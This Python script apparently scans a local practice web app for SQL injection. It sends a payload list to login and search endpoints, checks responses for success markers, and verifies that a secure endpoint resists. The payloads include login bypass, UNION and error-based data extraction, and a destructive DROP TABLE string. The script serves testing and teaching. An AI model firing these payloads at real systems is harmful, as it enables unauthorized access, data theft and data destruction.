import requests
import time
import logging

# Configuration
BASE_URL = "http://127.0.0.1:5000"
LOGIN_URL = f"{BASE_URL}/login"
SEARCH_URL = f"{BASE_URL}/search"

# Payload List
PAYLOADS = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "admin' --",
    "user' UNION SELECT 1, 'Hacked', 'Secret', 'Admin' --",
    "'; DROP TABLE users; --",  # Destructive (won't actually work in sqlite with .execute())
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 0,1), 0x7e) as x FROM information_schema.tables GROUP BY x) AS y) --"
]

def check_sqli(url, method="POST", data=None, params=None):
    try:
        if method == "POST":
            response = requests.post(url, data=data)
        else:
            response = requests.get(url, params=params)
        
        # Detection Heuristics
        indicators = [
            "Logged in as: admin",
            "Logged in as: alice",
            "Hacked",
            "syntax error",
            "sqlite3.OperationalError"
        ]
        
        for indicator in indicators:
            if indicator in response.text:
                return True, indicator
                
        return False, None
    except requests.exceptions.ConnectionError:
        print("Error: Could not connect to the server. Is it running?")
        return False, None

def run_detection():
    print("--- Starting SQLi Detection Scan ---")
    
    # Test Login
    print("\nTesting Vulnerable Login Endpoint...")
    for payload in PAYLOADS:
        is_vuln, reason = check_sqli(LOGIN_URL, method="POST", data={"username": payload, "password": "any"})
        if is_vuln:
            print(f"[!] POSITIVE: SQLi detected in Login with payload: {payload}")
            print(f"    Reason: Found indicator '{reason}'")
            logging.info(f"DETECTION: SQLi confirmed on /login with payload: {payload}")
        else:
            print(f"[-] Negative: {payload}")

    # Test Search
    print("\nTesting Vulnerable Search Endpoint...")
    for payload in PAYLOADS:
        is_vuln, reason = check_sqli(SEARCH_URL, method="GET", params={"role": payload})
        if is_vuln:
            print(f"[!] POSITIVE: SQLi detected in Search with payload: {payload}")
            print(f"    Reason: Found indicator '{reason}'")
            logging.info(f"DETECTION: SQLi confirmed on /search with payload: {payload}")
        else:
            print(f"[-] Negative: {payload}")

    # Test Secure Login (Verification)
    print("\nTesting Secure Login Endpoint (Expecting Negatives)...")
    for payload in PAYLOADS:
        is_vuln, reason = check_sqli(f"{BASE_URL}/secure-login", method="POST", data={"username": payload, "password": "any"})
        if is_vuln:
            print(f"[!] WARNING: Unexpected result on Secure endpoint with payload: {payload}")
        else:
            print(f"[-] Secure: {payload}")

if __name__ == "__main__":
    run_detection()
